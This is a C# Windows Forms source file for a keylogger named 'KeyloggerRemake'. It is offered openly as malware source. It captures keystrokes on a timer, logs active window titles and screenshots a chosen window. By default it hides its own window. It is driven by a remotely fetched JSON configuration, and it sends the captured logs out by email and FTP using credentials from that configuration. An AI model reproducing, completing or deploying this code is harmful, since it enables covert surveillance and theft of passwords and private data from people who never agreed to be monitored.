using System;
using System.ComponentModel;
using System.Windows.Forms;
using System.Threading;

namespace KeyloggerRemake
{
    public partial class frmMain : Form
    {
        private string strHost = "";
        private string strUser = "";
        private string strPass = "";

        private static string strFromEmail, strEmailHost, strEmailPass;
        private static int intEmailPort;
        private string strReceipentUser = "";
        private string strScreenshotWindow = "";

        private bool blTakeScreenshot;
        private bool blSendEmail;
        private bool blUploadFTP;

        private bool blStartLog = false;
        private bool blHide = true;

        private bool blJSONdled = false;

        private classLog currentLog;

        private static classJsonObj.classJson objJson;

        public frmMain()
        {
            InitializeComponent();

            doFirst();
        }

        private void doFirst()
        {
            objJson = classJsonObj.initializeObj();
            backgroundWorker1.RunWorkerAsync();
            Thread.Sleep(1000);
            tmrParseSettings.Start();
        }

        private void frmMain_Activated(object sender, EventArgs e)
        {
            checkHide();
        }

        private void checkStatus()
        {
            if (blJSONdled == true)
            {
                if (blStartLog == true)
                {
                    startLogging();
                }
                else
                {
                    stopLogging();
                }
            }
        }

        private void checkHide()
        {
            if (blHide == true)
            {
                this.Hide();
            }
            else
            {
                this.Show();
            }
        }

        private void getSettings()
        {
            strHost = objJson.FTP.Host;
            strUser = objJson.FTP.User;
            strPass = objJson.FTP.Pass;

            strEmailHost = objJson.Email.Host;
            strFromEmail = objJson.Email.FromEmail;
            intEmailPort = objJson.Email.Port;
            strEmailPass = objJson.Email.Pass;
            strReceipentUser = objJson.Email.ToEmail;
            strScreenshotWindow = objJson.Email.Window;

            blTakeScreenshot = objJson.Check.TakeScreenshot;
            blSendEmail = objJson.Check.SendEmail;
            blUploadFTP = objJson.Check.UploadFTP;

            if (blStartLog != objJson.Check.Start)
            {
                blStartLog = objJson.Check.Start;
                checkStatus();
            }

            if (blHide != objJson.Check.Hide)
            {
                blHide = objJson.Check.Hide;
                checkHide();
            }
        }

        private void startLogging()
        {
            currentLog = new classLog();
            statusChanger("Started");

            tmrCheckKeys.Start();
            tmrGetWindow.Start();
        }

        private void stopLogging()
        {
            statusChanger("Stopped");

            tmrCheckKeys.Stop();
            tmrGetWindow.Stop();

            if (blSendEmail == true)
            {
                sendEmail(strReceipentUser);
            }

            if (blUploadFTP == true)
            {
                currentLog.saveLog(strHost, strUser, strPass);
            }

            //GC.Collect();
        }

        private void sendEmail(String strReceipient)
        {
            classEmail.sendMsg(classEmail.getMsg(currentLog, strReceipentUser, strFromEmail), strFromEmail, strEmailPass, strEmailHost, intEmailPort);
        }

        private void checkWindow(String strScreenshotWindow)
        {
            if (classScreenshot.detectSpecificWindow(strScreenshotWindow) == true)
            {
                classScreenshot Screenshot = new classScreenshot(strScreenshotWindow);
                if (currentLog.checkScreenshots(Screenshot.strScreenshotName) == false)
                {
                    Screenshot.takeScreenshot();
                    currentLog.stkScreenshots.Enqueue(Screenshot);
                    txtLog.AppendText(currentLog.addToLog(Environment.NewLine + "Screenshot taken" + Environment.NewLine));
                }
            }
        }

        private void statusChanger(String Status)
        {
            if (Status.Equals("Started"))
            {
                clearLog();

                txtLog.AppendText(currentLog.addToLog(currentLog.printStartedLog()));
            }
            else if (Status.Equals("Stopped"))
            {

                txtLog.AppendText(currentLog.addToLog(currentLog.printStoppedLog()));
            }
        }

        private void clearLog()
        {
            txtLog.Clear();
        }

        private void checkForKeys() //Effective, but, inefficient?
        {
            String strKey = "";

            strKey = classGetKeys.checkAlphabet() 
                + classGetKeys.checkExtraKeys() 
                + classGetKeys.checkExtraKeys() 
                + classGetKeys.checkMoreExtraKeys()
                + classGetKeys.checkNumbersAndAbove()
                + classGetKeys.checkNumpad();

            txtLog.AppendText(currentLog.addToLog(strKey));
        }

        private void currentWindowScreenshot()
        {
            checkWindow(classGetUserInfo.strCurrentWindow);
        }

        private void tmrCheckKeys_Tick(object sender, EventArgs e)
        {
            checkForKeys();
        }

        private void tmrGetWindow_Tick(object sender, EventArgs e)
        {
            classGetUserInfo.strCurrentWindow = classGetUserInfo.getActiveWindowTitle();
            txtCurrentWindow.Text = classGetUserInfo.strCurrentWindow;

            if (blTakeScreenshot == true)
            {
                checkWindow(strScreenshotWindow);
            }
        }

        private void tmrParseSettings_Tick(object sender, EventArgs e)
        {
            getSettings();
        }

        private void txtCurrentWindow_TextChanged(object sender, EventArgs e)
        {
            txtLog.AppendText(currentLog.addToLog(currentLog.printNewWindow()));
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                objJson = classJsonObj.initializeObj();

                if (blJSONdled == false)
                {
                    blJSONdled = true;
                }
            }          
        }
    }
}
